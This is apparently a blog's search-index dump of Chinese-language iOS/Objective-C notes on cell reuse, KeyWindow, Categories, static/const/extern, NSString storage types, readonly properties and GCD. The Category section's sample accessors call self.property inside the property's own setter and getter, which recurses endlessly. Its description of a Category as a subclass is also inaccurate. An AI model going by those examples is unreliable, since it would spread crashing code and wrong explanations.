不复用的实现首先看不采用复用方法的Cell生成,遵循UITableViewDataSource生成cell - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath&#123; NSString *cellIdentifier = [NSString stringWithFormat:@&quot;cell%tu&quot;,indexPath.row]; UITableViewCell *cell = [[UITableViewCell alloc]initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier]; return cell; &#125; 由以上函数可知,这是传统思维,给予每个cell一个identifer然后通过后缀的行数返回给Table每个cell,这样如果我有100行,我就有100个cell在内存里,这样无疑是十分消耗内存的 复用的实现复用就是,我使用一个cellIdentifer展示100个cell,那么就要用到**dequeueReusableCellWithIdentifier:**函数 - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath&#123; static NSString *cellIdentifier = @&quot;cellID&quot;; UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier]; if (cell == nil) &#123; cell = [[UITableViewCell alloc]initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier]; &#125; return cell; &#125; 以上的复用过程主要过程是 我在静态区声明一个cellIndentifer,不用每次执行到这里都初始化一个NSString 然后用dequeueReusableCellWithIdentifier:函数根据Indentifer从一个复用池(cocoa框架自带的)里取cell 如果取不到(cell == nil),就重新初始化一个 那么如果采用复用方法,100行的cell会发生什么 假设一屏有10行 不可否认的是我至少需要10个长的一样的cell 那么前10行通过tableView:cellForRowAtIndexPath:时,都会因为复用池中没有identifer为”cellID”的cell从而去初始化 此时用户下滑,第1行移出屏幕,第11行移入屏幕 第1行移出屏幕,identifer为”cellID”的一个cell进入复用池 第11行移入屏幕时,经过tableView:cellForRowAtIndexPath:内时,通过dequeueReusableCellWithIdentifier:函数从复用池中取出刚刚第1行放入的cell,完成复用 如果此时又上滑,第11行移出屏幕,cell被放回复用池又被第一行取走 需要注意的是,通常为了保障动画的流畅,10行可能需要12-15个cell进行复用 Cell也可以用在普通View中由于Cell本身就是一个View,所以不一定非得加载在Table中,普通的View也可以直接用 UITableViewCell *cell = [[UITableViewCell alloc]init]; [self.view addSubview:cell]; 但是由于其不在UITableViewDelegate的tableView:didSelectRowAtIndexPath:中实现选中功能,所以其本身不能交互,需要进行设置 [cell setUserInteractionEnabled:YES]; 而且又由于其不是button,并不能touchUpInside,所以需要通过添加手势来交互 UITapGestureRecognizer *gestureOnCell = [[UITapGestureRecognizer alloc]initWithTarget:self action:@selector(tapGestureOnAlbumCell:)]; [cell addGestureRecognizer:gestureOnCell]; 感觉并不好用呢╮&lt;(=╯-╰=)&gt;╭ 但是可以省去自定义view,可以利用系统的样式,减少开发工作 [cell setAccessoryType:UITableViewCellAccessoryDisclosureIndicator]; [cell.textLabel setText:@&quot;cellTitle&quot;]; [cell.imageView setImage:[UIImage imageNamed:@&quot;account_headImg_picture&quot;]];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"TableViewCell","slug":"TableViewCell","permalink":"http://yoursite.com/tags/TableViewCell/"}]},{"title":"App的视图启动原理和KeyWindow","date":"2015-12-31T15:00:00.000Z","path":"2016/01/01/App的视图启动原理和KeyWindow/","text":"App视图启动的两个方式通过StoryBoard建立的视图通过StoryBoard建立的视图,会在info.plist里有一个键值Main storyboard file base name,可以改更第一次启动的StoryBoard的文件 通过xib或者纯代码建立的视图(initWithNib)如果通过xib或者纯代码建立的视图,需要在AppDelegate.m里的 application:willFinishLaunchingWithOptions: 实现以下代码 1234567- (BOOL)application:(UIApplication *)application willFinishLaunchingWithOptions:(NSDictionary *)launchOptions &#123; UIWindow *window &#x3D; [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]]; myViewController &#x3D; [[MyViewController alloc] init]; window.rootViewController &#x3D; myViewController; [window makeKeyAndVisible]; return YES;&#125; 以上是旧版代码，新版代码 Application 里面内置了一个window对象,可以用 self.window 123456789var window: UIWindow?func application(_ application: UIApplication, willFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey : Any]? &#x3D; nil) -&gt; Bool &#123; let viewController: UIViewController &#x3D; UIViewController() self.window &#x3D; UIWindow(frame: UIScreen.main.bounds) self.window?.rootViewController &#x3D; viewController; self.window?.makeKeyAndVisible() return true&#125; 代码完成了以下工作 创建一个和当前设备屏幕同样大小的Window 创建一个ViewController 让ViewController成为Window的RootView 让Window成为KeyWindow和Visible(顶置到最前) 需要注意的事情 Window一定要和UIScreen的尺寸一样大,不然没有填充的地方就是黑色的 一定要makeKeyAndVisible,不然无法显示 什么是AppDelegateAppDelegate就是你的程序的委托,实现了iOS本身和你的App的一些交互,你的程序安装到iOS里,就会有一个指针指向你的App(猜测),大厅是委托者,你的App是执行者(iOS.delegate = app),遵循AppDelegate的Protocol. 所以说启动程序,就是大厅执行了一个函数启动并进入了你的App,伪代码可以理解成[iOS launchApp:app],就进入了你的程序.你的程序的所有代码对于iOS这个系统来讲,都在一个出不去的函数里. 对于iOS本身和你App的交互,都在AppDelegate的协议里进行,比如进入后台等等. 什么是Window任何可视化程序,包括操作系统,都是由以下视图结构构成: DrawContext(Screen)-Window-View-Context, DrawContext就是C++里的DC,承载像素点.像素点组成Window,Window(窗口)里可以管理不同的View(视图),View本身是由Context(上下文组成) 官方文档为Understanding Windows and Screens 1. Window包括什么Window主要包括三个功能点 承担响应者Response,用来反馈交互. 管理View,包括View的朝向Orientation Screen指针,指向显示这个Window的Screen屏幕 2. Window的等级在iOS上WindowLevel分为三个等级,通常所有的窗口都是Normal,窗口的等级都是根据排序来的,越靠前越高,Mac上不清楚分几个等级. const UIWindowLevel UIWindowLevelNormal; const UIWindowLevel UIWindowLevelAlert; const UIWindowLevel UIWindowLevelStatusBar; 3. 什么是keyWindow由Window等级可以知道一个Screen可以有多个Window,最典型的就是类似Mac桌面操作系统上,或者说iOS的Alert是一个Window,同时还存在app的主Window.但是我们的交互(键盘,触摸)指令是发送给哪个Window呢,所以就有了KeyWindow的概念,就是MFC里的焦点窗口. 由于iOS的程序只有一个Window,所有的界面都是在不同的View上展示的,所以默认的Window就应该是KeyWindow.而当Alert弹出的时候,KeyWindow会转移到Alert的Window上,你的交互才能被Alert窗口响应KeyWindow掌控着响应者链条,如果你不是init一个和UIScreen一样大小的Window,在没有被Window覆盖的Screen或者View无法响应用户操作 4. makeKeyAndVisible干了什么就是让你在App启动后,初始化的Window窗口变成该app的KeyWindow,用来响应操作,然后通过Visible顶置到所有Window的最前 5. 不是说iOS的app只有一个Window,为毛要Visible通常iOS只有一个Window,但是并不说不可以有两个Window,在通过外接屏幕的时候,可以让外接的屏幕作为第二个Window来展示信息(duetdisplay这个App),可以参考官方文档Using Windows to Present Content on Multiple Displays所以要Visible到最前","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Window","slug":"Window","permalink":"http://yoursite.com/tags/Window/"}]},{"title":"Category的实质和应用","date":"2015-12-31T15:00:00.000Z","path":"2016/01/01/Category的实质和应用/","text":"Category干什么用Category可以看作对一个Class的方法扩展,让扩展的方法通过原有的类名就可以调用,建立方法是在Xcode中add file里选.m文件,然后可以选择添加Category 比如我要经常创建一个特殊的View,那我应该怎么实现,可以通过继承和类目这两种形式实现. 使用继承进行自定义方法如果使用继承,那么会新建一个叫MyView的类继承于UIView,通过以下调用 [MyView createCustomView]; 但是这样的代码拿去给别人看的时候,别人如果不知道MyView继承于UIView怎么办,比如不叫MyView叫MyPic之类的乱七八糟的名字. 使用类目/分类进行自定义创建类目文件 //MyView的类目 UIView+MyView.h UIView+MyView.m 在使用的时候如下调用方法 #import &quot;UIView+MyView.h&quot; [UIView createCustomView]; 如此可以让其它开发者更明白你创建的是什么,而且更利于代码的通用性. Category这么好,要继承干毛正如上文所说,Category主要是用来扩展方法,其自身通常不声明属性,例如UIView的扩展仅能访问UIView.h里的属性.在你扩展的不仅仅是方法,还有属性的时候,还是继承比较好. Category与属性(porperty)的讨探为什么Category不声明属性 因为Category声明的属性通常无法被私有化 Category的属性交叉调用容易造成混乱 Category真的无法声明属性么Category技术上可以被私有化,也可以声明属性 通过Runtime给被扩展Class添加私有属性 Category对应的.h文件里声明的属性需要自己实现Get/Set方法 Category的属性为什么无法私有化通常我们的私有属性都是放在.m的Extension里,又叫做Class-Continue @interface Class () @end 这个Class-Continue/Extension本身就是一个无分类名称的分类,因为”()”中无任何字节,而所有外部的Category内无法使用,即使写入到外部Category的.m中编译无误,也无法访问内部属性.但是如果不新建新的.h/.m文件,而是和Class本身共用一个,那就可以访问.(例如UIView等内部的Category都是利用该原理,很多分类和UIView Class共用.h/.m文件) Caution:Class-Continue/Extension仅可被Class自身访问,无法被Class-Category访问,除非!!Category与Class本身共用一个.h/.m文件 Category为何要自己实现Get/Set方法因为Category并没有自己的实例化函数,Class在实例化(init)的时候内部的Property会被@synthesis成_property的名字.但并不会去Category的函数进行处理,所以Category内部无法通过_property调用自己的函数,需要通过**self.**调用 - (void)setProperty:(id)property &#123; self.property = property; &#125; - (id)property &#123; if(self.property) &#123; return self.property; &#125; id tempProperty = [[Class alloc]init]; returen tempProperty; &#125; - (void)logProperty &#123; NSLog(@&quot;%@&quot;,self.property); &#125; 如果不对Category的属性重写Get/Set方法,那么将会造成class.categoryProperty访问该属性的时候就会Crash. Fuck这么坑,自己在Category里Synthesis成不成不成,如果手动写了**@systhesis**编译器会报Error @synthesize not allowed in a category&#39;s implementation Category实质是什么Category的实质是另外一个类,这个类继承了被扩展类的public成员和方法,并且可以声明和实现自己成员和方法,唯一与继承不同的是,扩展的所有成员都是被扩展类的public成员,并且与被扩展类共用一个类名.","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Category","slug":"Category","permalink":"http://yoursite.com/tags/Category/"}]},{"title":"NSInteger的大小判断与NSNotFound","date":"2015-12-31T15:00:00.000Z","path":"2016/01/01/NSInteger的大小判断与NSNotFound/","text":"关于OC整数的判断整数判断无非是大于等于小于,但是如果在取某些整数的取不到,可以通过NSNotFound判断,如取字符串range NSRange range = [textField.text rangeOfString:@&quot;.&quot;]; if (range.location == NSNotFound) &#123; //do something &#125; NSNotFound是什么static const NSInteger NSNotFound = NSIntegerMax; #define NSIntegerMax LONG_MAX #define LONG_MAX __LONG_MAX__ NSNotFound本身就是NSIntegerMax,NSIntegerMax则是__LONG_MAX__,也就是long类型的最大值.如果你通过断点观察,无效的NSInteger就是一个特别长的数.","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"Xcode7中Const/Static/Extern的区别与研究","date":"2015-12-31T15:00:00.000Z","path":"2016/01/01/Xcode7中ConstStaticExtern的区别与研究/","text":"Const/Static/Extern的区别参照以往的定义 const的作用： const仅仅用来修饰右边的变量（基本数据变量p，指针变量*p）。 被const修饰的变量是只读的。 static的作用 延长变量的生命周期,程序结束才会销毁。 在同一作用域或文件中该语句只会在编译时被执行一次(初始化一次),无法用断点捕捉。 改变变量的作用域。 针对不同变量 Static局部变量： 在当前的”{}”内部有且仅有一份,且不会随着函数结束而被释放(作用1),函数多次被调用,始终保持同一内存地址同一值(作用2). 修饰全局变量 在当前文件中只有一份(作用1),即使声明在.h中,多个.m加载同一个.h,变量名称一样,但是实际地址是独立的(作用3),每个独立的变量多次调用始终保持同一地址(作用2) extern的作用 只是用来获取全局变量(包括全局静态变量)的值，不能用于定义变量 extern工作原理:先在当前文件查找有没有全局变量，没有找到，才会去其他文件查找。 Const/Static/Extern的常用方法static常用于TableViewCell的Identifer - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath&#123; static NSString *cellIdentifier = @&quot;cell&quot;;//使用静态避免多次初始化 UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier]; if (cell == nil) &#123; cell = [[UITableViewCell alloc]initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier]; &#125; return cell; &#125; const和extern常用于全局的常量字符串,比如全局的通知字符串,其中UIKIT_EXTERN等于extern,如果不加UIKIT_EXTERN,需要加载定义的头文件,如果加了,只需要加载UIKit库就可以使用,不需要特意加载头文件 //.h UIKIT_EXTERN NSString *const CallBackNotification; //.m NSString *const CallBackNotification = @&quot;CallBackNotification&quot;; Xcode7.2中Static NSString的研究结论:Xcode7.2中对字符串的处理static已经不用特意标记了,已经被默认.只要是通过@””创建的字符串,只要内容一样,都指向同一个内存. static测试根据以上概念,static修饰于局部变量的时候,会延长局部变量的生命周期,到底是延长多久呢?于是用以下代码测试. //viewController.m - (void)viewDidAppear:(BOOL)animated &#123; [super viewDidAppear:animated]; for (int i = 0; i &lt; 10; ++i) &#123; [self printValue]; &#125; NSLog(@&quot;weakPoint = %p&quot;,_otherWeakClass.weakPoint); &#125; - (void)printValue &#123; static NSString *tempStr = @&quot;xxx&quot;; if (!_otherWeakClass.point) &#123; _otherWeakClass.point = tempStr; NSLog(@&quot;weakPoint get value&quot;); &#125; NSLog(@&quot;%p ==== %@,weakPoint = %p&quot;,tempStr,tempStr,_otherWeakClass.weakPoint); &#125; - (void)dealloc &#123; NSLog(@&quot;ViewController did dealloc %p&quot;,self); &#125; //otherWeakClass.m - (void)touchUpInsidePrintBtn:(UIButton *)button &#123; NSLog(@&quot;_waekPoint = %p,value = %@&quot;,_waekPoint,_waekPoint); &#125; 在以上测试中,用一个ViewController中声明的static的字符串,然后用另外一个类的weakPoint指针指向它.在不同的地方打印字符串本身或者weakPoint. 然后奇怪的事情发生了(￣ε(#￣) ,和教科书上讲的不一样 无论何时打印weakPoint,总能得到和tempStr一样的值和地址,也就是说内存始终没有被释放,检查weakPoint指向内存的retainCount,得到的是18446744073709551615,也就是(2^64-1）.这是什么鬼＞﹏＜ 2016-01-11 14:43:16.835 Learn[24725:3132909] weakPoint get value 2016-01-11 14:43:20.541 Learn[24725:3132909] 0x10b36e620 ==== xxx,weakPoint = 0x10b36e620 2016-01-11 14:43:20.542 Learn[24725:3132909] 0x10b36e620 ==== xxx,weakPoint = 0x10b36e620 2016-01-11 14:43:20.542 Learn[24725:3132909] 0x10b36e620 ==== xxx,weakPoint = 0x10b36e620 ....... 2016-01-11 14:43:20.543 Learn[24725:3132909] 0x10b36e620 ==== xxx,weakPoint = 0x10b36e620 2016-01-11 14:43:20.543 Learn[24725:3132909] weakPoint = 0x10b36e620,value = xxx 为了验证教科书是否正确,用以下代码,代替了Static那一行,按说应该10次输出10个不同的地址 NSString *tempStr = @&quot;xxx&quot;; 结果呢…..让我思密达了,输出还是一模一样的….地址仍然没有变,那我再换一种呢 NSString *tempStr = [NSString stringWithFormat:@&quot;%@&quot;,@&quot;xxx&quot;]; 这样总是重新初始化了吧…结果(´･ω･`)还是没变…难道Xcode坏掉了 NSString *str1 = @&quot;xxx&quot;; NSString *str2 = @&quot;xxx&quot;; NSLog(@&quot;str1 address = %p, str2 address = %p&quot;,str1,str2); 于是写下这样的基本代码来测试…发现str1和str2地址还是一样的….(°ー°〃=)&gt;书本上写的都喂狗了么….为什么会这样 static分析于是打上断点,在控制台里,分别用print和print object指令打印不同的字符串,看看有什么不同 static NSString *tempStr = @&quot;xxx&quot;;//__NSCFConstantString NSString *tempStr = @&quot;xxx&quot;;//__NSCFConstantString NSString *tempStr = [NSString stringWithFormat:@&quot;%@&quot;,@&quot;xxx&quot;];//NSTaggedPointerString 发现凡是通过@””创建的都是__NSCFConstantString的字符串,static根本就没鸟用啊…但是通过stringWithFormat创建的就是NSTaggedPointerString.这两个有啥差别呢 差别 __NSCFConstantString 字符串常量，是一种编译时常量，它的 retainCount 值很大，是 4294967295，在控制台打印出的数值则是 18446744073709551615==2^64-1，测试证明，即便对其进行 release 操作，retainCount 也不会产生任何变化。是创建之后便是放不掉的对象。相同内容的 __NSCFConstantString 对象的地址相同，也就是说常量字符串对象是一种单例。 这种对象一般通过字面值 @”…”、CFSTR(“…”) 或者 stringWithString: 方法（需要说明的是，这个方法在 iOS6 SDK 中已经被称为redundant，使用这个方法会产生一条编译器警告。这个方法等同于字面值创建的方法）产生。 这种对象存储在字符串常量区。 __NSTaggedPointerString 这个类型是标签指针字符串，这是苹果在 64 位环境下对 NSString,NSNumber 等对象做的一些优化。简单来讲可以理解为把指针指向的内容直接放在了指针变量的内存地址中，因为在 64 位环境下指针变量的大小达到了 8 位足以容纳一些长度较小的内容。于是使用了标签指针这种方式来优化数据的存储方式。从他的引用计数可以看出，这货也是一个释放不掉的单例常量对象。在运行时根据实际情况创建。 对于 NSString 对象来讲，当非字面值常量的数字，英文字母字符串的长度小于等于 9 的时候会自动成为 NSTaggedPointerString 类型. 如果有中文或其他特殊符号（可能是非 ASCII 字符）存在的话则会直接成为 ）__NSCFString 类型。 这种对象被直接存储在指针的内容中，可以当作一种伪对象。 __NSCFString 这个才是教科书上教的传统的字符串,和 __NSCFConstantString 不同， __NSCFString 对象是在运行时创建的一种 NSString 子类，他并不是一种字符串常量。所以和其他的对象一样在被创建时获得了 1 的引用计数。 通过 NSString 的 stringWithFormat等方法创建的中文NSString对象一般都是这种类型。 这种对象被存储在堆上。 教科书回来了如果按照以上分析,把字符串改为中文,并且用初始化的方法进行生成,打印结果就是10个不同的地址了. - (void)printValue &#123; NSString *tempStr = [NSString stringWithFormat:@&quot;%@&quot;,@&quot;哈哈&quot;]; if (!_otherWeakClass.point) &#123; _otherWeakClass.point = tempStr; NSLog(@&quot;weakPoint get value&quot;); &#125; NSLog(@&quot;%p ==== %@,weakPoint = %p&quot;,tempStr,tempStr,_otherWeakClass.weakPoint); &#125; 如果这个时候我在初始化方法前加入Static行不行 static NSString *tempStr = [NSString stringWithFormat:@&quot;%@&quot;,@&quot;哈哈&quot;]; 这个时候编译器会提示错误: Initializer element is not a compile-time constant 初始化方法不是一个编译时的常量,也就是说static必须针对一个可以编译时就确定的变量,而不是运行时动态生成的.这也是为什么很少见UIView前加入static的原因. 非字符串的Static变量(运行时)运行时static的运用复测如果static变量声明时必须是complie-time(编译时)的,是不是就无法使用运行时的变量了?其实也是可以的,只要在编译时给予static变量一个固定值就可以了 &#123; static UIView *view = nil;//编译时给予空指针,确定指针的地址 view = [[UIView alloc]init];//运行时进行初始化,改变指针指向的内容 &#125; 如此就延长了view的指针自身地址的生命周期,但是其指向的内容是可以改变的.即使多次进入代码片段view指向的Object也不会被释放.有人会有疑问,多次进入代码static那一行赋值不会再次赋值么?就如同编译器提示的一样,static是编译时语句,只有编译时被执行,运行时不会被执行,所以不会赋值nil多次 运行时static作用域复测局部变量如果在同一个文件不同的函数中(局部变量),仅仅是针对该局部延长了生命周期,即使两个函数中的static变量都叫view,两个view并不在同一个地址,是两个独立的Object - (void)functionOne &#123; static UIView *view = nil; view = [[UIView alloc]init]; [view setBackgroundColor:[UIColor red]]; &#125; - (void)functionTwo &#123; static UIView *view = nil;//编译时给予空指针,确定指针的地址 view = [[UIView alloc]init];//运行时进行初始化,改变指针指向的内容 [view setBackgroundColor:[UIColor blue]]; &#125; 全局变量在不同的.m文件中,由于.m之间是互相不可见的,所以static限定作用域的作用就基本无用了,和普通的全局变量一样. static UIView *_view = nil; @implementation Class - (void)functionOne &#123; _view = [[UIView alloc]init]; &#125; @end 但是如果在.h文件中生命static的变量 //Class.h static UIView *_view = nil; @interface Class - (void)functionOne; @end 然后不同的点.m文件加载同一个.h //Class1.m #import &quot;Class.h&quot; //Class2.m #import &quot;Class.h&quot; 此时Class1.m中的全局变量_view和Class2.h中的全局变量_view不为同一个地址,两个的初始化是独立的. 局部static和全局static混用(作死小能手)同时在全局和局部声明static static UIView *_view = nil; @implementation Class - (void)functionOne &#123; NSLog(@&quot;%@&quot;,_view);//输出为nil _view = [[UIView alloc]init]; NSLog(@&quot;%@&quot;,_view);//输出为地址1 static UIView *_view = nil;//由于运行时不会执行,所以仍为全局的_view,地址1 NSLog(@&quot;%@&quot;,_view);//输出仍为地址1 &#125; @end 全局声明static,局部声明同名临时变量. static UIView *_view = nil; @implementation Class - (void)functionOne &#123; NSLog(@&quot;%@&quot;,_view);//输出为nil _view = [[UIView alloc]init]; NSLog(@&quot;%@&quot;,_view);//输出为地址1 UIView *_view = nil;//由于运行时执行,所以从此行往下都是局部变量_view,往上的_view则为全局变量 NSLog(@&quot;%@&quot;,_view);//输出为nil,打印的为局部变量 &#125; @end 参考文献[1] http://skyfly.xyz/2015/11/08/iOS核心编程/NSString的内存管理/","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"自定义Class的readnnly应用","date":"2015-12-31T15:00:00.000Z","path":"2016/01/01/自定义Class的readnnly应用/","text":"readnnly的Property应用如果我想自定义一个View,里面包含一个Label和一个Button,外界可以修改Label和Button的样式,如何定义 @property (nonatomic, strong) UIButton *button; @property (nonatomic, strong) UILabel *label; 如果按照上文定义,因为存在Set函数,所以说可以用外界实例化的button和label进行Set,可能会影响到内部的处理,为了保护button和label不被更改,需要声明readonly @property (nonatomic, strong, readonly) UIButton *button; @property (nonatomic, strong, readonly) UILabel *label; 声明了readonly之后,虽然button和label无法通过Set更改,但是由于label本身的title这个属性不是readonly的,所以仍然可以更改 [view.label setTitle:@&quot;change&quot;]; 但是这样就不行 [view setLabel:label]; 结论Property的readonly并不会传递,声明为readonly的property如果还有下一级property不为readonly,下一级的property还是可以改变的 系统自带的例子UIButton里的image和label,就是利用这个原理","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"重写系统函数注意调用super","date":"2015-12-31T15:00:00.000Z","path":"2016/01/01/重写系统函数注意调用super/","text":"重写父类的系统函数在自定义一些View的时候,经常会重写一些方法用来完成自定义. 但是在重写方法时,一定要注意重写时首先要完成系统的方法,调用[super function]才行,完成系统函数原本的功能","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"TextField隐藏光标","date":"2015-12-26T15:00:00.000Z","path":"2015/12/27/TextField隐藏光标/","text":"TextField隐藏光标把色板(Tint)颜色设置成透明 [_TextField setTintColor:[UIColor clearColor]];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"TextField","slug":"TextField","permalink":"http://yoursite.com/tags/TextField/"}]},{"title":"类方法创建一个带收回键盘的TextField","date":"2015-12-26T15:00:00.000Z","path":"2015/12/27/类方法创建一个带收回键盘的TextField/","text":"类方法创建一个带收回键盘的TextField默认键盘有时不带键盘回收按键,添加一个Button按下给键盘发送收回消息 + (UITextField *)createTextField:(CGRect)frame &#123; UITextField *textField = [[UITextField alloc] initWithFrame:frame]; textField.backgroundColor = [UIColor clearColor]; textField.contentVerticalAlignment = UIControlContentVerticalAlignmentCenter; textField.clearButtonMode = UITextFieldViewModeWhileEditing; textField.textColor = [UIColor blackColor]; textField.font = FONT15; //创建ToolBar作为TextField的AccessoryView UIToolbar *toolBar = [[UIToolbar alloc]init]; [toolBar setFrame:CGRectMake(0, 0, [UIScreen mainScreen].bounds.size.width, 44)]; //创建收起键盘按键 UIButton *returnBtn = [[UIButton alloc]init]; [returnBtn setFrame:CGRectMake(ScreenW - 100, 0, 100, 44)]; [returnBtn setTitle:@&quot;确定&quot; forState:UIControlStateNormal]; [returnBtn setTitleColor:[UIColor redColor] forState:UIControlStateNormal]; [returnBtn.titleLabel setFont:FONT15]; //点击对textField发送收起键盘消息 [returnBtn addTarget:textField action:@selector(resignFirstResponder) forControlEvents:UIControlEventTouchUpInside]; //添加按键到ToolBar上 [toolBar addSubview:returnBtn]; //添加ToolBar到TextField上 [textField setInputAccessoryView:toolBar]; return textField; &#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"TextField","slug":"TextField","permalink":"http://yoursite.com/tags/TextField/"}]},{"title":"GCD讲解与异步下载图片例子","date":"2015-12-20T15:00:00.000Z","path":"2015/12/21/GCD讲解与异步下载图片例子/","text":"GCD是什么CGD就是线程管理,通过dispatch(派发)功能进行操作，大部分函数都是C 异步的基本原理获取到全局的线程，然后扔(dispatch)一段函数过去，然后处理完毕再获取到当前线程，扔(dispatch)回来。 代码//dispatch_get_global_queue(long identifier, unsigned long flags) 全局线程 //dispatch_get_main_queue(void) 主线程 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^&#123; //被扔到全局的代码段 dispatch_async(dispatch_get_main_queue(), ^&#123; //被扔回主线程的代码段 &#125;); &#125;); 代码讲解 dispatch_async就是异步派发 dispatch_get_global_queue/dispatch_get_main_queue 都是C函数，所以可以直接执行 dispatch_get_global_queue的参数identifier是指的CPU的优先级，flags截止到iOS9都是保留位，无任何意义，必须传0，不然Return为NULL dispatch_get_main_queue即使没有参数也得结尾写()调用 dispatch_get_global_queue讲解先上原文/*! * @function dispatch_get_global_queue * * @abstract * Returns a well-known global concurrent queue of a given quality of service * class. * * @discussion * The well-known global concurrent queues may not be modified. Calls to * dispatch_suspend(), dispatch_resume(), dispatch_set_context(), etc., will * have no effect when used with queues returned by this function. * * @param identifier * A quality of service class defined in qos_class_t or a priority defined in * dispatch_queue_priority_t. * * It is recommended to use quality of service class values to identify the * well-known global concurrent queues: * - QOS_CLASS_USER_INTERACTIVE * - QOS_CLASS_USER_INITIATED * - QOS_CLASS_DEFAULT * - QOS_CLASS_UTILITY * - QOS_CLASS_BACKGROUND * * The global concurrent queues may still be identified by their priority, * which map to the following QOS classes: * - DISPATCH_QUEUE_PRIORITY_HIGH: QOS_CLASS_USER_INITIATED * - DISPATCH_QUEUE_PRIORITY_DEFAULT: QOS_CLASS_DEFAULT * - DISPATCH_QUEUE_PRIORITY_LOW: QOS_CLASS_UTILITY * - DISPATCH_QUEUE_PRIORITY_BACKGROUND: QOS_CLASS_BACKGROUND * * @param flags * Reserved for future use. Passing any value other than zero may result in * a NULL return value. * * @result * Returns the requested global queue or NULL if the requested global queue * does not exist. */ 在讲啥第一个参数identifier 推荐使用QOS_CLASS_USER_INTERACTIVE等全部通用的全局线程(queue)，这些都是iOS自己定义的 还有就是可以使用CPU里通用的进程优先级DISPATCH_QUEUE_PRIORITY_DEFAULT(这里可以去CPU相关基础答案) 第二个参数flags flags不要乱写，写了就真立flag了，传入0就好 flags不是0就返回NULL，是0就会返回请求的global queue 异步下载图片- (void)downloadHeadImgAsyncToImageView:(nullable UIImageView *)headImgView &#123; dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^&#123; NSString *urlString = @&quot;http://&quot;; NSURL *url = [NSURL URLWithString:urlString]; NSData *data = [NSData dataWithContentsOfURL:url]; UIImage *headImg = nil; if (data != nil &amp;&amp; ![urlString isEqualToString:@&quot;&quot;]) &#123; headImg = [UIImage imageWithData:data]; &#125; dispatch_async(dispatch_get_main_queue(), ^&#123; if (headImgView) &#123; [headImgView setImage:headImg]; &#125; &#125;); &#125;); &#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"GCD","slug":"GCD","permalink":"http://yoursite.com/tags/GCD/"}]},{"title":"如何判断是否为某一个类","date":"2015-12-20T15:00:00.000Z","path":"2015/12/21/如何判断是否为某一个类/","text":"如何取到某个类的类名OC的基类NSObject就有一个类方法，返回当前类名 + (Class)class OBJC_SWIFT_UNAVAILABLE(&quot;use &#39;aClass.self&#39; instead&quot;); 如何判断某个东西是否为一个类[object isKindOfClass:[NSObject class]]; 判断为某一个类时,如果是父类呢UIButton *btn = [[UIButton alloc]init]; BOOL isClass = [btn isKindofClass:[UIView Class]]; 此时isClass为Yes,真TM坑啊","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Class","slug":"Class","permalink":"http://yoursite.com/tags/Class/"}]},{"title":"ScrollView的Contentsize偏移","date":"2015-12-13T15:00:00.000Z","path":"2015/12/14/ScrollView的Contentsize偏移/","text":"ScrollView的Contentsize偏移offset的偏移到的是结束状态的左上角的坐标，而不是平移距离 偏移到最左边就是**(0,0)** 偏移一个屏幕的宽度**(self.view.bounds.size.width,0)** 偏移一个屏幕的高度**(0,self.view.bounds.size.height)** 1[_scrollView setContentOffset:CGPointMake(x, y) animated:YES];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"ScrollView","slug":"ScrollView","permalink":"http://yoursite.com/tags/ScrollView/"}]},{"title":"SwitchCase编译器报错","date":"2015-12-13T15:00:00.000Z","path":"2015/12/14/SwitchCase编译器报错/","text":"SwitchCase编译器大坑编译器Xcode 7.1 根据代码提示器，提示出的Switch…Case…语法是以下样式的,有时候statements如果不止一句话的情况会莫名其妙报错,不像VS可以多行逐步执行。 1234567891011switch (expression) &#123; case constant1: statements1 break; case constant2: statements2 break; default: break;&#125; 解决方法:加入{}oc中任意代码中插入{}不会影响编译 12345678910111213 switch (expression) &#123; case constant1: &#123; statements1 break;&#125; case constant2: &#123; statements2 break;&#125; default: break; &#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"字符串生成Class&Selector&Protocol","date":"2015-12-13T15:00:00.000Z","path":"2015/12/14/字符串生成Class&Selector&Protocol/","text":"NSClassFromString批量化初始化有时候一个一个类初始化过于麻烦，比如很多的subview 